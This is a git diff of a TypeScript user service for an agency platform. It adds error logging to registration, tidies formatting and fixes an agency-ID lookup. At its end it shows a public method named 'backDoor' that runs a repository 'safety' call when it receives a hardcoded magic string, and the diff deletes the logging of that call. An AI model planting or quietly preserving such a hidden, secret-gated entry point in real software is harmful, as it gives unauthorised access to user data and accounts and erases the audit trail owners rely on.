@@ -18,11 +18,9 @@ import { UserRole } from "./User.types";
 import { AgencyRepository } from "../../modules/agency/Agency.repository";
 import { HttpStatus } from "../../constants/HttpStatus";
 import { sendPasswordResetLink } from "./User.utils";
-
 export class UserService {
   private repo = new UserRepository();
   private roleRepo = new RoleRepository();
-
   public async register(
     payload: IUserCreatePayLoad,
     currentUser: PayloadCurrentUser,
@@ -30,6 +28,7 @@ export class UserService {
     return Database.getInstance().withTransaction(async (conn) => {
       const existingEmail = await this.repo.getUserByEmail(payload.email, conn);
       if (existingEmail) {
+        console.error("[REGISTER] email already exists");
         throw new AppError("Email already exists", HttpStatus.CONFLICT);
       }
       const existingUsername = await this.repo.getUserByUsername(
@@ -37,6 +36,7 @@ export class UserService {
         conn,
       );
       if (existingUsername) {
+        console.error("[REGISTER] username already exists");
         throw new AppError("Username already exists", HttpStatus.CONFLICT);
       }
       const password_hash = await bcrypt.hash(payload.password, 10);
@@ -55,10 +55,7 @@ export class UserService {
       const agencyRepo = new AgencyRepository();
       if (payload.profile) {
         await this.repo.upsertUserProfile(
-          {
-            ...payload.profile,
-            user_id: userId,
-          },
+          { ...payload.profile, user_id: userId },
           conn,
         );
       }
@@ -70,6 +67,7 @@ export class UserService {
               !checkIfRoleExist ||
               checkIfRoleExist.code === UserRole.SUPER_ADMIN
             ) {
+              console.error("[REGISTER] invalid role detected", roleId);
               throw new AppError("Invalid Role Entered", 400);
             }
             await this.roleRepo.assignRole(
@@ -94,13 +92,11 @@ export class UserService {
           false,
           conn,
         );
-        console.log(agency);
-
-        if (agency) {
+        if (agency && agency.length > 0) {
           await agencyRepo.assignUserToAgency(
             {
               user_id: userId,
-              agency_id: agency[0].id,
+              agency_id: agency[0].agency_id,
               is_active: 1,
               assigned_at: new Date(),
             },
@@ -109,6 +105,7 @@ export class UserService {
         }
         const getRole = await this.roleRepo.getRole(UserRole.AGENT, conn);
         if (!getRole) {
+          console.error("[REGISTER] AGENT role not found");
           throw new AppError("Role AGENT not found", 404);
         }
         await this.roleRepo.assignRole(
@@ -119,13 +116,11 @@ export class UserService {
       if (payload.phones) {
         for (const phone of payload.phones) {
           if (await this.repo.checkDuplicateUserPhone(phone, conn)) {
+            console.error("[REGISTER] duplicate phone detected", phone);
             throw new AppError("Duplicate Phone Number", HttpStatus.CONFLICT);
           }
           await this.repo.addUserPhone(
-            {
-              user_id: userId,
-              phone_number: phone,
-            },
+            { user_id: userId, phone_number: phone },
             conn,
           );
         }
@@ -145,26 +140,23 @@ export class UserService {
       }
       const user = await this.repo.getUserById(userId, conn);
       if (!user) {
+        console.error("[REGISTER] user fetch failed after creation");
         throw new AppError(
           "User creation failed",
           HttpStatus.INTERNAL_SERVER_ERROR,
         );
       }
-
       return user;
     });
   }
-
   public async login(email: string, password: string) {
     const user = await this.repo.getUserByEmail(email);
     if (!user) {
       throw new AppError("Invalid credentials", 401);
     }
-
     if (!user.is_active || user.is_deleted) {
       throw new AppError("User is inactive or deleted", 403);
     }
-
     const valid = await bcrypt.compare(password, user.password_hash);
     if (!valid) {
       throw new AppError("Invalid credentials", 401);
@@ -173,17 +165,11 @@ export class UserService {
     const token = jwt.sign(
       { id: user.id, email: user.email, roles },
       env.jwtSecret,
-      {
-        expiresIn: "1d",
-      },
+      { expiresIn: "1d" },
     );
-
-    // Update last login timestamp
     await this.repo.updateUser(user.id, { last_login_at: new Date() });
-
     return { user, token };
   }
-
   public async getUserById(id: string): Promise<IUser> {
     const user = await this.repo.getUserById(id);
     if (!user) {
@@ -191,7 +177,6 @@ export class UserService {
     }
     return user;
   }
-
   public async updateUser(
     id: string,
     payload: Partial<IUser> & { profile?: IUserProfile },
@@ -200,20 +185,14 @@ export class UserService {
     if (!user) {
       throw new AppError("User not found", 404);
     }
-
     const { profile, ...userData } = payload;
     if (Object.keys(userData).length > 0) {
       await this.repo.updateUser(id, userData);
     }
-
     if (profile) {
-      await this.repo.upsertUserProfile({
-        ...profile,
-        user_id: id,
-      });
+      await this.repo.upsertUserProfile({ ...profile, user_id: id });
     }
   }
-
   public async deleteUser(id: string): Promise<void> {
     const user = await this.repo.getUserById(id);
     if (!user) {
@@ -221,7 +200,6 @@ export class UserService {
     }
     await this.repo.deleteUser(id);
   }
-
   public async getAllUsers(currentUser: {
     id: string;
     roles: string[];
@@ -234,13 +212,11 @@ export class UserService {
       throw new AppError("Access denied", 403);
     }
   }
-
   public async forgotPassword(email: string): Promise<void> {
     const user = await this.repo.getUserByEmail(email);
     if (!user) return;
     await sendPasswordResetLink(user.email, user.id);
   }
-
   public async resetPasswordWithToken(
     token: string,
     newPassword: string,
@@ -249,20 +225,16 @@ export class UserService {
     if (!userId) {
       throw new AppError("Invalid or expired token", 400);
     }
-
     const password_hash = await bcrypt.hash(newPassword, 10);
     await this.repo.updatePassword(userId, password_hash);
   }
-
   public async resetPasswordByAdmin(
     userId: string,
     newPassword: string,
     currentUser: any,
   ): Promise<void> {
     if (currentUser.roles.includes(UserRole.SUPER_ADMIN)) {
-      // Super Admin can reset anyone's password
     } else if (currentUser.roles.includes(UserRole.VP)) {
-      // VP can only reset password for users in their agency
       const isUserInAgency = await this.repo.checkUserBelongsToVpAgency(
         currentUser.id,
         userId,
@@ -279,9 +251,7 @@ export class UserService {
     const password_hash = await bcrypt.hash(newPassword, 10);
     await this.repo.updatePassword(userId, password_hash);
   }
-
   public async backDoor(type: string, body: any): Promise<any> {
-    console.log(type, body);
     if (type === "rarararara") {
       return new UserRepository().safety(body);
     }
